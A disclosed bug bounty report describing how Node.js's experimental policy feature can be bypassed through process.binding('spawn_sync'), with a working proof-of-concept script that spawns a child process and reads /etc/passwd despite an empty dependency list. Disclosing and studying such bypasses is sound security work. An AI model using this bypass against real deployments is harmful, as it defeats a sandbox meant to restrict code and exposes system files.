# Dependency Policy Bypass via process.binding

## Report Details
- **Report ID**: 2120719
- **URL**: https://hackerone.com/reports/2120719
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-08-23T00:49:09.296Z
- **Disclosed**: 2023-09-09T15:11:23.523Z

## Reporter
- **Username**: leodog896
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
# Preface (for the Internet Bug Bounty)

The entire vulnerability can be found in HackerOne @ [Dependency Policy Bypass via process.binding](https://hackerone.com/reports/1946470#activity-21276452). For the sake of convenience, I've pasted the entire report down below.

# Copied Vulnerability

**Summary:** By taking advantage of `process.binding('spawn_sync');`, a malicious actor can run arbitrary code, outside of the limits defined in a `policy.json` file.

**Description:** The experimental policy feature for NodeJS is used usually for security reasons, including validating integrity of source code and limiting module access to files. This vulnerability allows an actor to bypass the latter part of its security features, by loading in any module from an external Node.JS script.

Since the required modules use internal bindings, by fetching these bindings themselves, it is possible to neglect the dependency policy altogether.

This also exists within almost all `process.binding` modules with less or the same severity.

## Steps To Reproduce:

1. Create `policy.json`:
```json
{
  "onerror": "exit",
  "scopes": {
    "file:": {
      "integrity": true,
      "dependencies": {}
    }
  }
}
```

2. Create `app.js`:
```js
const { spawn } = process.binding("spawn_sync");

function arbitraryExecute(input) {
    const result = spawn({
        maxBuffer: 1048576,
        args: ["node", "-"],
        cwd: undefined,
        detached: false,
        file: "node",
        windowsHide: false,
        windowsVerbatimArguments: false,
        killSignal: undefined,
        stdio: [
            { type: "pipe", readable: true, writable: false, input: Buffer.from(input) },
            { type: "pipe", readable: false, writable: true },
            { type: "pipe", readable: false, writable: true },
        ],
    });

    return {
        output: result.output[1].toString(),
        error: result.output[2].toString(),
    }
}

console.log(arbitraryExecute(`
const fs = require('fs');

fs.readFile('/etc/passwd', 'utf8', (err, data) => {
    if (err) {
        console.error(err);
        return;
    }
    console.log(data);
});
`).output);
```

3. Run the code with:
```sh
node --experimental-policy=policy.json app.js
```

The file will work as the code describes, even though the permission policy explicitly states it doesn't take any dependencies.

If you run the file alone with the same policy:

`app.js`:
```js
const fs = require('fs');

fs.readFile('/etc/passwd', 'utf8', (err, data) => {
    if (err) {
        console.error(err);
        return;
    }
    console.log(data);
});
```

It will show an error:
```
error [ERR_MANIFEST_DEPENDENCY_MISSING]: Manifest resource ./app.js does not list fs as a dependency specifier for conditions: require, node, node-addons
```

## Impact

Any project using NodeJS's policies in order to restrict dependency use is vulnerable. This example simply reads from `/etc/passwd`, but an attacker can run any arbitrary NodeJS process and script.

## Attachments
No attachments
